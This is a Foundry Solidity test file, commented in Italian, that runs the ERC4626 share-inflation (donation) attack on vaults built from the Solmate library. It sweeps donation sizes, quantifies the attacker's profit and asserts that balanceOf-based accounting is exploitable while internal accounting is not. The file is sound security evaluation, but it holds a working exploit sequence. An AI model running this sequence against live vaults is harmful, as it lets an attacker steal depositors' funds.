// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// EXEC-GATE su SORGENTE UPSTREAM REALE (il vero Solmate ERC4626). Esegue l'attacco e QUANTIFICA il furto.
// Emette righe canoniche `RESULT <name> maxProfit=<int> witness=<int>` lette dall'oracolo (ForgeGateOracle).
// Solmate=AGPL -> solo in EVAL (exp/), mai nel core-prodotto.
import "forge-std/Test.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";
import {ERC4626} from "solmate/tokens/ERC4626.sol";
import {MockToken, VaultBalanceOf, VaultInternal} from "../src/Targets.sol";

contract RealSolmateGate is Test {
    address atk = address(0xA11CE);
    address vic = address(0xB0B);

    function _attack(uint256 V, uint256 D, bool internalAcct) internal returns (int256 profit, bool blocked) {
        MockToken t = new MockToken();
        ERC4626 v;
        if (internalAcct) v = new VaultInternal(ERC20(address(t)));
        else v = new VaultBalanceOf(ERC20(address(t)));
        t.mint(atk, 1 + D);
        t.mint(vic, V);
        vm.startPrank(atk);
        t.approve(address(v), type(uint256).max);
        v.deposit(1, atk);
        t.transfer(address(v), D);
        vm.stopPrank();
        vm.startPrank(vic);
        t.approve(address(v), type(uint256).max);
        try v.deposit(V, vic) returns (uint256) {
            vm.stopPrank();
        } catch {
            vm.stopPrank();
            return (int256(0), true);
        }
        vm.startPrank(atk);
        uint256 got = v.redeem(v.balanceOf(atk), atk, atk);
        vm.stopPrank();
        profit = int256(got) - int256(1 + D);
        blocked = false;
    }

    function _sweep(bool internalAcct) internal returns (int256 maxP, uint256 bestD, uint256 blockedCount) {
        uint256 V = 100e18;
        uint256[12] memory Ds = [uint256(1e18), 10e18, 25e18, 40e18, 49e18, 50e18,
                                 51e18, 60e18, 75e18, 90e18, 99e18, 100e18];
        maxP = type(int256).min;
        for (uint256 i = 0; i < 12; i++) {
            (int256 p, bool blocked) = _attack(V, Ds[i], internalAcct);
            if (blocked) { blockedCount++; continue; }
            if (p > maxP) { maxP = p; bestD = Ds[i]; }
        }
    }

    function testGateBalanceOf() public {
        (int256 maxP, uint256 bestD, uint256 blocked) = _sweep(false);
        emit log_named_int("balanceof_maxProfit", maxP);
        emit log_named_uint("balanceof_witness_D", bestD);
        emit log_named_uint("blocked_by_ZERO_SHARES", blocked);
        // riga canonica per l'oracolo:
        emit log_string(string.concat("RESULT solmate_balanceof maxProfit=", vm.toString(maxP),
                                      " witness=", vm.toString(bestD)));
        assertGt(maxP, int256(0), "REAL solmate(balanceOf) deve essere sfruttabile per esecuzione");
    }

    function testGateInternal() public {
        (int256 maxP, , ) = _sweep(true);
        emit log_named_int("internal_maxProfit", maxP);
        emit log_string(string.concat("RESULT solmate_internal maxProfit=", vm.toString(maxP), " witness=0"));
        assertLe(maxP, int256(0), "accounting interno: nessun furto deve essere possibile");
    }
}
